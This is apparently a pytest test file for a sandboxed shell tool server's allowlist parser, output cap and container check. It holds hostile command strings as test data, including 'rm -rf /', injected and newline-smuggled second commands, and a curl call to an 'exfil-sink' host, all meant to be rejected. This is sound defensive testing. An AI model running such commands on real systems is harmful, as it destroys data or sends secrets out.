"""Shell server logic that never executes anything (safe on any host)."""

from pathlib import Path

import pytest

from tools_servers.shell import server as shell
from tools_servers.shell.server import (
    DEFAULT_ALLOWLIST,
    CommandRejected,
    RunResult,
    parse_allowlist,
    parse_command,
)

ALLOW = frozenset(DEFAULT_ALLOWLIST)


@pytest.mark.parametrize(
    ("cmd", "argv"),
    [
        ("ls -la docs", ["ls", "-la", "docs"]),
        ("cat '.env'", ["cat", ".env"]),
        ('grep -n "a|b" docs/readme.md', ["grep", "-n", "a|b", "docs/readme.md"]),
        # No shell: metacharacters are inert literal arguments.
        ("echo hi; rm -rf /", ["echo", "hi;", "rm", "-rf", "/"]),
        ("cat docs/readme.md | wc -l", ["cat", "docs/readme.md", "|", "wc", "-l"]),
        ("echo $(whoami) > out.txt", ["echo", "$(whoami)", ">", "out.txt"]),
        ('python3 -c "print(1)"', ["python3", "-c", "print(1)"]),
    ],
)
def test_parse_ok(cmd: str, argv: list[str]) -> None:
    assert parse_command(cmd, ALLOW) == argv


@pytest.mark.parametrize(
    "cmd",
    [
        "",
        "   ",
        "rm -rf /",
        "bash -c 'ls'",
        "sh",
        "curl http://exfil-sink:8000",
        "/bin/ls",
        "./ls",
        "..\\ls",
        "echo 'unterminated",
        "echo a\nrm -rf /",
        "echo a\x00b",
        "echo " + "x" * shell.MAX_CMD_CHARS,
        "echo " + " a" * shell.MAX_ARGS,
    ],
)
def test_parse_rejected(cmd: str) -> None:
    with pytest.raises(CommandRejected):
        parse_command(cmd, ALLOW)


def test_allowlist_configurable() -> None:
    assert parse_allowlist(None) == ALLOW
    assert parse_allowlist("") == ALLOW
    custom = parse_allowlist(" ls , cat ")
    assert custom == {"ls", "cat"}
    with pytest.raises(CommandRejected):
        parse_command("python3 -c 1", custom)
    with pytest.raises(ValueError):
        parse_allowlist("ls,/bin/sh")


def test_render() -> None:
    assert (
        RunResult(0, "a", "", False).render() == "exit_code: 0\n--- stdout ---\na\n--- stderr ---\n"
    )
    assert RunResult(-9, "", "", True).render().startswith("exit_code: timeout")


def test_output_cap(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(shell, "MAX_OUTPUT_CHARS", 5)
    assert shell._cap("abcdefgh") == "abcde\n[truncated 3 chars]"


def test_refuses_outside_container(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setenv("SANDBOX_IN_CONTAINER", "1")  # marker alone is not enough
    if Path("/.dockerenv").exists():
        pytest.skip("running inside a container")
    assert shell.in_container() is False
    with pytest.raises(RuntimeError):
        shell.build_server(tmp_path, ALLOW)
    with pytest.raises(SystemExit):
        shell.main()
